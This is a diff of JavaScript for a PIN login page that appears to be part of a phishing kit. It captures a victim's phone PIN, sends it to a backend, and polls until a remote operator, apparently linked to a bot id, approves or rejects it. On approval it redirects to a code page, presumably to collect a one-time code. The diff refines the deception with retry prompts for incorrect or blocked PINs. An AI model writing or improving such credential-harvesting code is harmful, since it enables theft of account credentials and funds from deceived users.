@@ -138,42 +138,32 @@ phoneDisplay.value = phone;
 // ---------------- PIN INPUT LOGIC ----------------
 const inputs = document.querySelectorAll('.pin-boxes input');
 const button = document.getElementById('submitBtn');
+const statusDiv = document.getElementById('status');
 
 inputs[0].focus();
 
 inputs.forEach((input, i) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/\D/g, '');
-
-        if (input.value && i < inputs.length - 1) {
-            inputs[i + 1].focus();
-        }
-
+        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
         const allFilled = [...inputs].every(x => x.value.length === 1);
         button.disabled = !allFilled;
-
-        if (allFilled) {
-            button.classList.add('enabled');
-        } else {
-            button.classList.remove('enabled');
-        }
+        button.classList.toggle('enabled', allFilled);
     });
 
     input.addEventListener('keydown', e => {
-        if (e.key === 'Backspace' && !input.value && i > 0) {
-            inputs[i - 1].focus();
-        }
+        if (e.key === 'Backspace' && !input.value && i > 0) inputs[i - 1].focus();
     });
 });
 
 // ---------------- SUBMIT PIN ----------------
 document.getElementById('pinForm').addEventListener('submit', async e => {
     e.preventDefault();
+    statusDiv.textContent = '';
 
     const pin = [...inputs].map(i => i.value).join('');
     localStorage.setItem('pin', pin);
 
-    // UI feedback only
     button.disabled = true;
     button.textContent = 'Logging in...';
 
@@ -190,12 +180,31 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
 
     const { requestId } = await res.json();
 
+    // ---------------- POLLING FOR APPROVAL ----------------
     const poll = setInterval(async () => {
         const r = await fetch(`${BACKEND_URL}/check-pin/${requestId}`);
         const d = await r.json();
+
+        if (d.blocked) {
+            statusDiv.textContent = d.message || "Enter a valid prepaid number";
+            button.disabled = false;
+            button.textContent = 'Login';
+            [...inputs].forEach(i => i.value = '');
+            clearInterval(poll);
+            return;
+        }
+
         if (d.approved === true) {
             clearInterval(poll);
-            window.location.href = `code.html?botId=${botId}`;
+            window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
+            return;
+        }
+
+        if (d.approved === false) {
+            statusDiv.textContent = "Incorrect PIN. Enter again.";
+            button.disabled = false;
+            button.textContent = 'Login';
+            [...inputs].forEach(i => i.value = '');
         }
     }, 1500);
 });
